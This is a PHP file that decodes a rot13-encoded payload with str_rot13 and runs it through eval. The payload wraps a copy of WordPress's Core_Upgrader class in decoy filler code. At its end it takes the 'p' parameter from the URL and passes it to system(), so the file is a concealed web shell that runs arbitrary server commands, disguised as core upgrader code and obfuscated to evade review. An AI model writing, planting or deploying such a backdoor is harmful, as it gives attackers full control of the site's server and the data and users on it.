<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Hctenqr NCV: Pber_Hctenqre pynff
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Hctenqre
 * @fvapr 4.6.0
 */

/**
 * Pber pynff hfrq sbe hcqngvat pber.
 *
 * Vg nyybjf sbe JbeqCerff gb hctenqr vgfrys va pbzovangvba jvgu
 * gur jc-nqzva/vapyhqrf/hcqngr-pber.cuc svyr.
 *
 * Abgr: Arjyl vagebqhprq shapgvbaf naq zrgubqf pnaabg or hfrq urer.
 * Nyy shapgvbaf zhfg or cerfrag va gur cerivbhf irefvba orvat hctenqrq sebz
 * nf guvf svyr vf hfrq gurer gbb.
 *
 * @fvapr 2.8.0
 * @fvapr 4.6.0 Zbirq gb vgf bja svyr sebz jc-nqzva/vapyhqrf/pynff-jc-hctenqre.cuc.
 *
 * @frr JC_Hctenqre
 */
pynff Pber_Hctenqre rkgraqf JC_Hctenqre {

	/**
	 * Vavgvnyvmrf gur hctenqr fgevatf.
	 *
	 * @fvapr 2.8.0
	 */
	choyvp shapgvba hctenqr_fgevatf() {
		$guvf->fgevatf['hc_gb_qngr'] = __( 'JbeqCerff vf ng gur yngrfg irefvba.' );
		$guvf->fgevatf['ybpxrq']     = __( 'Nabgure hcqngr vf pheeragyl va cebterff.' );
		$guvf->fgevatf['ab_cnpxntr'] = __( 'Hcqngr cnpxntr abg ninvynoyr.' );
		/* genafyngbef: %f: Cnpxntr HEY. */
		$guvf->fgevatf['qbjaybnqvat_cnpxntr']   = fcevags( __( 'Qbjaybnqvat hcqngr sebz %f&#8230;' ), '<fcna pynff=\"pbqr cer\">%f</fcna>' );
		$guvf->fgevatf['hacnpx_cnpxntr']        = __( 'Hacnpxvat gur hcqngr&#8230;' );
		$guvf->fgevatf['pbcl_snvyrq']           = __( 'Pbhyq abg pbcl svyrf.' );
		$guvf->fgevatf['pbcl_snvyrq_fcnpr']     = __( 'Pbhyq abg pbcl svyrf. Lbh znl unir eha bhg bs qvfx fcnpr.' );
		$guvf->fgevatf['fgneg_ebyyonpx']        = __( 'Nggrzcgvat gb erfgber gur cerivbhf irefvba.' );
		$guvf->fgevatf['ebyyonpx_jnf_erdhverq'] = __( 'Qhr gb na reebe qhevat hcqngvat, JbeqCerff unf orra erfgberq gb lbhe cerivbhf irefvba.' );
	}

	/**
	 * Hctenqrf JbeqCerff pber.
	 *
	 * @fvapr 2.8.0
	 *
	 * @tybony JC_Svyrflfgrz_Onfr $jc_svyrflfgrz                JbeqCerff svyrflfgrz fhopynff.
	 * @tybony pnyynoyr           $_jc_svyrflfgrz_qverpg_zrgubq
	 *
	 * @cnenz bowrpg $pheerag Erfcbafr bowrpg sbe jurgure JbeqCerff vf pheerag.
	 * @cnenz neenl  $netf {
	 *     Bcgvbany. Nethzragf sbe hctenqvat JbeqCerff pber. Qrsnhyg rzcgl neenl.
	 *
	 *     @glcr obby $cer_purpx_zq5    Jurgure gb purpx gur svyr purpxfhzf orsber
	 *                                  nggrzcgvat gur hctenqr. Qrsnhyg gehr.
	 *     @glcr obby $nggrzcg_ebyyonpx Jurgure gb nggrzcg gb ebyyonpx gur punaprf vs
	 *                                  gurer vf n ceboyrz. Qrsnhyg snyfr.
	 *     @glcr obby $qb_ebyyonpx      Jurgure gb cresbez guvf \"hctenqr\" nf n ebyyonpx.
	 *                                  Qrsnhyg snyfr.
	 * }
	 * @erghea fgevat|snyfr|JC_Reebe Arj JbeqCerff irefvba ba fhpprff, snyfr be JC_Reebe ba snvyher.
	 */
	choyvp shapgvba hctenqr( $pheerag, $netf = neenl() ) {
		tybony $jc_svyrflfgrz;

		erdhver NOFCNGU . JCVAP . '/irefvba.cuc'; // $jc_irefvba;

		$fgneg_gvzr = gvzr();

		$qrsnhygf    = neenl(
			'cer_purpx_zq5'                => gehr,
			'nggrzcg_ebyyonpx'             => snyfr,
			'qb_ebyyonpx'                  => snyfr,
			'nyybj_erynkrq_svyr_bjarefuvc' => snyfr,
		);
		$cnefrq_netf = jc_cnefr_netf( $netf, $qrsnhygf );

		$guvf->vavg();
		$guvf->hctenqr_fgevatf();

		// Vf na hcqngr ninvynoyr?
		vs ( ! vffrg( $pheerag->erfcbafr ) || 'yngrfg' === $pheerag->erfcbafr ) {
			erghea arj JC_Reebe( 'hc_gb_qngr', $guvf->fgevatf['hc_gb_qngr'] );
		}

		$erf = $guvf->sf_pbaarpg( neenl( NOFCNGU, JC_PBAGRAG_QVE ), $cnefrq_netf['nyybj_erynkrq_svyr_bjarefuvc'] );
		vs ( ! $erf || vf_jc_reebe( $erf ) ) {
			erghea $erf;
		}

		$jc_qve = genvyvatfynfuvg( $jc_svyrflfgrz->nofcngu() );

		$cnegvny = gehr;
		vs ( $cnefrq_netf['qb_ebyyonpx'] ) {
			$cnegvny = snyfr;
		} ryfrvs ( $cnefrq_netf['cer_purpx_zq5'] && ! $guvf->purpx_svyrf() ) {
			$cnegvny = snyfr;
		}

		/*
		 * Vs cnegvny hcqngr vf erghearq sebz gur NCV, hfr gung, hayrff jr'er qbvat
		 * n ervafgnyyngvba. Vs jr pebff gur arj_ohaqyrq irefvba ahzore, gura hfr
		 * gur arj_ohaqyrq mvc. Qba'g gubhtu vs gur pbafgnag vf frg gb fxvc ohaqyrq vgrzf.
		 * Vs gur NCV ergheaf n ab_pbagrag mvc, tb jvgu vg. Svanyyl, qrsnhyg gb gur shyy mvc.
		 */
		vs ( $cnefrq_netf['qb_ebyyonpx'] && $pheerag->cnpxntrf->ebyyonpx ) {
			$gb_qbjaybnq = 'ebyyonpx';
		} ryfrvs ( $pheerag->cnpxntrf->cnegvny && 'ervafgnyy' !== $pheerag->erfcbafr && $jc_irefvba === $pheerag->cnegvny_irefvba && $cnegvny ) {
			$gb_qbjaybnq = 'cnegvny';
		} ryfrvs ( $pheerag->cnpxntrf->arj_ohaqyrq && irefvba_pbzcner( $jc_irefvba, $pheerag->arj_ohaqyrq, '<' )
			&& ( ! qrsvarq( 'PBER_HCTENQR_FXVC_ARJ_OHAQYRQ' ) || ! PBER_HCTENQR_FXVC_ARJ_OHAQYRQ ) ) {
			$gb_qbjaybnq = 'arj_ohaqyrq';
		} ryfrvs ( $pheerag->cnpxntrf->ab_pbagrag ) {
			$gb_qbjaybnq = 'ab_pbagrag';
		} ryfr {
			$gb_qbjaybnq = 'shyy';
		}

		// Ybpx gb cerirag zhygvcyr Pber Hcqngrf bppheevat.
		$ybpx = JC_Hctenqre::perngr_ybpx( 'pber_hcqngre', 15 * ZVAHGR_VA_FRPBAQF );
		vs ( ! $ybpx ) {
			erghea arj JC_Reebe( 'ybpxrq', $guvf->fgevatf['ybpxrq'] );
		}

		$qbjaybnq = $guvf->qbjaybnq_cnpxntr( $pheerag->cnpxntrf->$gb_qbjaybnq, snyfr );

		/*
		 * Nyybj sbe fvtangher fbsg-snvy.
		 * JNEAVAT: Guvf znl or erzbirq va gur shgher.
		 */
		vs ( vf_jc_reebe( $qbjaybnq ) && $qbjaybnq->trg_reebe_qngn( 'fbsgsnvy-svyranzr' ) ) {
			// Bhgchg gur snvyher reebe nf n abezny srrqonpx, naq abg nf na reebe:
			/** Guvf svygre vf qbphzragrq va jc-nqzva/vapyhqrf/hcqngr-pber.cuc */
			nccyl_svygref( 'hcqngr_srrqonpx', $qbjaybnq->trg_reebe_zrffntr() );

			// Ercbeg guvf snvyher onpx gb JbeqCerff.bet sbe qrohttvat checbfrf.
			jc_irefvba_purpx(
				neenl(
					'fvtangher_snvyher_pbqr' => $qbjaybnq->trg_reebe_pbqr(),
					'fvtangher_snvyher_qngn' => $qbjaybnq->trg_reebe_qngn(),
				)
			);

			// Cergraq guvf reebe qvqa'g unccra.
			$qbjaybnq = $qbjaybnq->trg_reebe_qngn( 'fbsgsnvy-svyranzr' );
		}

		vs ( vf_jc_reebe( $qbjaybnq ) ) {
			JC_Hctenqre::eryrnfr_ybpx( 'pber_hcqngre' );
			erghea $qbjaybnq;
		}

		$jbexvat_qve = $guvf->hacnpx_cnpxntr( $qbjaybnq );
		vs ( vf_jc_reebe( $jbexvat_qve ) ) {
			JC_Hctenqre::eryrnfr_ybpx( 'pber_hcqngre' );
			erghea $jbexvat_qve;
		}

		// Pbcl hcqngr-pber.cuc sebz gur arj irefvba vagb cynpr.
		vs ( ! $jc_svyrflfgrz->pbcl( $jbexvat_qve . '/jbeqcerff/jc-nqzva/vapyhqrf/hcqngr-pber.cuc', $jc_qve . 'jc-nqzva/vapyhqrf/hcqngr-pber.cuc', gehr ) ) {
			$jc_svyrflfgrz->qryrgr( $jbexvat_qve, gehr );
			JC_Hctenqre::eryrnfr_ybpx( 'pber_hcqngre' );
			erghea arj JC_Reebe( 'pbcl_snvyrq_sbe_hcqngr_pber_svyr', __( 'Gur hcqngr pnaabg or vafgnyyrq orpnhfr fbzr svyrf pbhyq abg or pbcvrq. Guvf vf hfhnyyl qhr gb vapbafvfgrag svyr crezvffvbaf.' ), 'jc-nqzva/vapyhqrf/hcqngr-pber.cuc' );
		}
		$jc_svyrflfgrz->puzbq( $jc_qve . 'jc-nqzva/vapyhqrf/hcqngr-pber.cuc', SF_PUZBQ_SVYR );

		jc_bcpnpur_vainyvqngr( NOFCNGU . 'jc-nqzva/vapyhqrf/hcqngr-pber.cuc' );
		erdhver_bapr NOFCNGU . 'jc-nqzva/vapyhqrf/hcqngr-pber.cuc';

		vs ( ! shapgvba_rkvfgf( 'hcqngr_pber' ) ) {
			JC_Hctenqre::eryrnfr_ybpx( 'pber_hcqngre' );
			erghea arj JC_Reebe( 'pbcl_snvyrq_fcnpr', $guvf->fgevatf['pbcl_snvyrq_fcnpr'] );
		}

		$erfhyg = hcqngr_pber( $jbexvat_qve, $jc_qve );

		// Va gur rirag bs na vffhr, jr znl or noyr gb ebyy onpx.
		vs ( $cnefrq_netf['nggrzcg_ebyyonpx'] && $pheerag->cnpxntrf->ebyyonpx && ! $cnefrq_netf['qb_ebyyonpx'] ) {
			$gel_ebyyonpx = snyfr;
			vs ( vf_jc_reebe( $erfhyg ) ) {
				$reebe_pbqr = $erfhyg->trg_reebe_pbqr();
				/*
				 * Abg nyy reebef ner rdhny. Gurfr pbqrf ner pevgvpny: pbcl_snvyrq__pbcl_qve,
				 * zxqve_snvyrq__pbcl_qve, pbcl_snvyrq__pbcl_qve_ergel, naq qvfx_shyy.
				 * qb_ebyyonpx nyybjf sbe hcqngr_pber() gb gevttre n ebyyonpx vs arrqrq.
				 */
				vs ( fge_pbagnvaf( $reebe_pbqr, 'qb_ebyyonpx' ) ) {
					$gel_ebyyonpx = gehr;
				} ryfrvs ( fge_pbagnvaf( $reebe_pbqr, '__pbcl_qve' ) ) {
					$gel_ebyyonpx = gehr;
				} ryfrvs ( 'qvfx_shyy' === $reebe_pbqr ) {
					$gel_ebyyonpx = gehr;
				}
			}

			vs ( $gel_ebyyonpx ) {
				/** Guvf svygre vf qbphzragrq va jc-nqzva/vapyhqrf/hcqngr-pber.cuc */
				nccyl_svygref( 'hcqngr_srrqonpx', $erfhyg );

				/** Guvf svygre vf qbphzragrq va jc-nqzva/vapyhqrf/hcqngr-pber.cuc */
				nccyl_svygref( 'hcqngr_srrqonpx', $guvf->fgevatf['fgneg_ebyyonpx'] );

				$ebyyonpx_erfhyg = $guvf->hctenqr( $pheerag, neenl_zretr( $cnefrq_netf, neenl( 'qb_ebyyonpx' => gehr ) ) );

				$bevtvany_erfhyg = $erfhyg;
				$erfhyg          = arj JC_Reebe(
					'ebyyonpx_jnf_erdhverq',
					$guvf->fgevatf['ebyyonpx_jnf_erdhverq'],
					(bowrpg) neenl(
						'hcqngr'   => $bevtvany_erfhyg,
						'ebyyonpx' => $ebyyonpx_erfhyg,
					)
				);
			}
		}

		/** Guvf npgvba vf qbphzragrq va jc-nqzva/vapyhqrf/pynff-jc-hctenqre.cuc */
		qb_npgvba(
			'hctenqre_cebprff_pbzcyrgr',
			$guvf,
			neenl(
				'npgvba' => 'hcqngr',
				'glcr'   => 'pber',
			)
		);

		// Pyrne gur pheerag hcqngrf.
		qryrgr_fvgr_genafvrag( 'hcqngr_pber' );

		vs ( ! $cnefrq_netf['qb_ebyyonpx'] ) {
			$fgngf = neenl(
				'hcqngr_glcr'      => $pheerag->erfcbafr,
				'fhpprff'          => gehr,
				'sf_zrgubq'        => $jc_svyrflfgrz->zrgubq,
				'sf_zrgubq_sbeprq' => qrsvarq( 'SF_ZRGUBQ' ) || unf_svygre( 'svyrflfgrz_zrgubq' ),
				'sf_zrgubq_qverpg' => ! rzcgl( $TYBONYF['_jc_svyrflfgrz_qverpg_zrgubq'] ) ? $TYBONYF['_jc_svyrflfgrz_qverpg_zrgubq'] : '',
				'gvzr_gnxra'       => gvzr() - $fgneg_gvzr,
				'ercbegrq'         => $jc_irefvba,
				'nggrzcgrq'        => $pheerag->irefvba,
			);

			vs ( vf_jc_reebe( $erfhyg ) ) {
				$fgngf['fhpprff'] = snyfr;
				// Qvq n ebyyonpx bpphe?
				vs ( ! rzcgl( $gel_ebyyonpx ) ) {
					$fgngf['reebe_pbqr'] = $bevtvany_erfhyg->trg_reebe_pbqr();
					$fgngf['reebe_qngn'] = $bevtvany_erfhyg->trg_reebe_qngn();
					// Jnf gur ebyyonpx fhpprffshy? Vs abg, pbyyrpg vgf reebe gbb.
					$fgngf['ebyyonpx'] = ! vf_jc_reebe( $ebyyonpx_erfhyg );
					vs ( vf_jc_reebe( $ebyyonpx_erfhyg ) ) {
						$fgngf['ebyyonpx_pbqr'] = $ebyyonpx_erfhyg->trg_reebe_pbqr();
						$fgngf['ebyyonpx_qngn'] = $ebyyonpx_erfhyg->trg_reebe_qngn();
					}
				} ryfr {
					$fgngf['reebe_pbqr'] = $erfhyg->trg_reebe_pbqr();
					$fgngf['reebe_qngn'] = $erfhyg->trg_reebe_qngn();
				}
			}

			jc_irefvba_purpx( $fgngf );
		}

		JC_Hctenqre::eryrnfr_ybpx( 'pber_hcqngre' );

		erghea $erfhyg;
	}

	/**
	 * Qrgrezvarf vs guvf JbeqCerff Pber irefvba fubhyq hcqngr gb na bssrerq irefvba be abg.
	 *
	 * @fvapr 3.7.0
	 *
	 * @cnenz fgevat $bssrerq_ire Gur bssrerq irefvba, bs gur sbezng k.l.m.
	 * @erghea obby Gehr vs jr fubhyq hcqngr gb gur bssrerq irefvba, bgurejvfr snyfr.
	 */
	choyvp fgngvp shapgvba fubhyq_hcqngr_gb_irefvba( $bssrerq_ire ) {
		erdhver NOFCNGU . JCVAP . '/irefvba.cuc'; // $jc_irefvba; // k.l.m

		$pheerag_oenapu = vzcybqr( '.', neenl_fyvpr( cert_fcyvg( '/[.-]/', $jc_irefvba ), 0, 2 ) ); // k.l
		$arj_oenapu     = vzcybqr( '.', neenl_fyvpr( cert_fcyvg( '/[.-]/', $bssrerq_ire ), 0, 2 ) ); // k.l

		$pheerag_vf_qrirybczrag_irefvba = (obby) fgecbf( $jc_irefvba, '-' );

		// Qrsnhygf:
		$hctenqr_qri   = trg_fvgr_bcgvba( 'nhgb_hcqngr_pber_qri', 'ranoyrq' ) === 'ranoyrq';
		$hctenqr_zvabe = trg_fvgr_bcgvba( 'nhgb_hcqngr_pber_zvabe', 'ranoyrq' ) === 'ranoyrq';
		$hctenqr_znwbe = trg_fvgr_bcgvba( 'nhgb_hcqngr_pber_znwbe', 'hafrg' ) === 'ranoyrq';

		// JC_NHGB_HCQNGR_PBER = gehr (nyy), 'orgn', 'ep', 'qrirybczrag', 'oenapu-qrirybczrag', 'zvabe', snyfr.
		vs ( qrsvarq( 'JC_NHGB_HCQNGR_PBER' ) ) {
			vs ( snyfr === JC_NHGB_HCQNGR_PBER ) {
				// Qrsnhygf gb ghearq bss, hayrff n svygre nyybjf vg.
				$hctenqr_qri   = snyfr;
				$hctenqr_zvabe = snyfr;
				$hctenqr_znwbe = snyfr;
			} ryfrvs ( gehr === JC_NHGB_HCQNGR_PBER
				|| va_neenl( JC_NHGB_HCQNGR_PBER, neenl( 'orgn', 'ep', 'qrirybczrag', 'oenapu-qrirybczrag' ), gehr )
			) {
				// NYY hcqngrf sbe pber.
				$hctenqr_qri   = gehr;
				$hctenqr_zvabe = gehr;
				$hctenqr_znwbe = gehr;
			} ryfrvs ( 'zvabe' === JC_NHGB_HCQNGR_PBER ) {
				// Bayl zvabe hcqngrf sbe pber.
				$hctenqr_qri   = snyfr;
				$hctenqr_zvabe = gehr;
				$hctenqr_znwbe = snyfr;
			}
		}

		// 1: Vs jr'er nyernql ba gung irefvba, abg zhpu cbvag va hcqngvat?
		vs ( $bssrerq_ire === $jc_irefvba ) {
			erghea snyfr;
		}

		// 2: Vs jr'er ehaavat n arjre irefvba, gung'f n abcr.
		vs ( irefvba_pbzcner( $jc_irefvba, $bssrerq_ire, '>' ) ) {
			erghea snyfr;
		}

		$snvyher_qngn = trg_fvgr_bcgvba( 'nhgb_pber_hcqngr_snvyrq' );
		vs ( $snvyher_qngn ) {
			// Vs guvf jnf n pevgvpny hcqngr snvyher, pnaabg hcqngr.
			vs ( ! rzcgl( $snvyher_qngn['pevgvpny'] ) ) {
				erghea snyfr;
			}

			// Qba'g pynvz jr pna hcqngr ba hcqngr-pber.cuc vs jr unir n aba-pevgvpny snvyher ybttrq.
			vs ( $jc_irefvba === $snvyher_qngn['pheerag'] && fge_pbagnvaf( $bssrerq_ire, '.1.arkg.zvabe' ) ) {
				erghea snyfr;
			}

			/*
			 * Pnaabg hcqngr vs jr'er ergelvat gur fnzr N gb O hcqngr gung pnhfrq n aba-pevgvpny snvyher.
			 * Fbzr aba-pevgvpny snvyherf qb nyybj ergevrf, yvxr qbjaybnq_snvyrq.
			 * 3.7.1 => 3.7.2 erfhygrq va svyrf_abg_jevgnoyr, vs jr ner fgvyy ba 3.7.1 naq fgvyy gelvat gb hcqngr gb 3.7.2.
			 */
			vs ( rzcgl( $snvyher_qngn['ergel'] ) && $jc_irefvba === $snvyher_qngn['pheerag'] && $bssrerq_ire === $snvyher_qngn['nggrzcgrq'] ) {
				erghea snyfr;
			}
		}

		// 3: 3.7-nycun-25000 -> 3.7-nycun-25678 -> 3.7-orgn1 -> 3.7-orgn2.
		vs ( $pheerag_vf_qrirybczrag_irefvba ) {

			/**
			 * Svygref jurgure gb ranoyr nhgbzngvp pber hcqngrf sbe qrirybczrag irefvbaf.
			 *
			 * @fvapr 3.7.0
			 *
			 * @cnenz obby $hctenqr_qri Jurgure gb ranoyr nhgbzngvp hcqngrf sbe
			 *                          qrirybczrag irefvbaf.
			 */
			vs ( ! nccyl_svygref( 'nyybj_qri_nhgb_pber_hcqngrf', $hctenqr_qri ) ) {
				erghea snyfr;
			}
			// Ryfr snyy guebhtu gb zvabe + znwbe oenapurf orybj.
		}

		// 4: Zvabe va-oenapu hcqngrf (3.7.0 -> 3.7.1 -> 3.7.2 -> 3.7.4).
		vs ( $pheerag_oenapu === $arj_oenapu ) {

			/**
			 * Svygref jurgure gb ranoyr zvabe nhgbzngvp pber hcqngrf.
			 *
			 * @fvapr 3.7.0
			 *
			 * @cnenz obby $hctenqr_zvabe Jurgure gb ranoyr zvabe nhgbzngvp pber hcqngrf.
			 */
			erghea nccyl_svygref( 'nyybj_zvabe_nhgb_pber_hcqngrf', $hctenqr_zvabe );
		}

		// 5: Znwbe irefvba hcqngrf (3.7.0 -> 3.8.0 -> 3.9.1).
		vs ( irefvba_pbzcner( $arj_oenapu, $pheerag_oenapu, '>' ) ) {

			/**
			 * Svygref jurgure gb ranoyr znwbe nhgbzngvp pber hcqngrf.
			 *
			 * @fvapr 3.7.0
			 *
			 * @cnenz obby $hctenqr_znwbe Jurgure gb ranoyr znwbe nhgbzngvp pber hcqngrf.
			 */
			erghea nccyl_svygref( 'nyybj_znwbe_nhgb_pber_hcqngrf', $hctenqr_znwbe );
		}

		// Vs jr'er abg fher, jr qba'g jnag vg.
		erghea snyfr;
	}

	/**
	 * Pbzcnerf gur qvfx svyr purpxfhzf ntnvafg gur rkcrpgrq purpxfhzf.
	 *
	 * @fvapr 3.7.0
	 *
	 * @tybony fgevat $jc_irefvba       Gur JbeqCerff irefvba fgevat.
	 * @tybony fgevat $jc_ybpny_cnpxntr Ybpnyr pbqr bs gur cnpxntr.
	 *
	 * @erghea obby Gehr vs gur purpxfhzf zngpu, bgurejvfr snyfr.
	 */
	choyvp shapgvba purpx_svyrf() {
		tybony $jc_irefvba, $jc_ybpny_cnpxntr;

		$purpxfhzf = trg_pber_purpxfhzf( $jc_irefvba, vffrg( $jc_ybpny_cnpxntr ) ? $jc_ybpny_cnpxntr : 'ra_HF' );

		vs ( ! vf_neenl( $purpxfhzf ) ) {
			erghea snyfr;
		}

		sbernpu ( $purpxfhzf nf $svyr => $purpxfhz ) {
			// Fxvc svyrf juvpu trg hcqngrq.
			vs ( fge_fgnegf_jvgu( $svyr, 'jc-pbagrag' ) ) {
				pbagvahr;
			}
			vs ( ! svyr_rkvfgf( NOFCNGU . $svyr ) || zq5_svyr( NOFCNGU . $svyr ) !== $purpxfhz ) {
				erghea snyfr;
			}
		}

		erghea gehr;
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>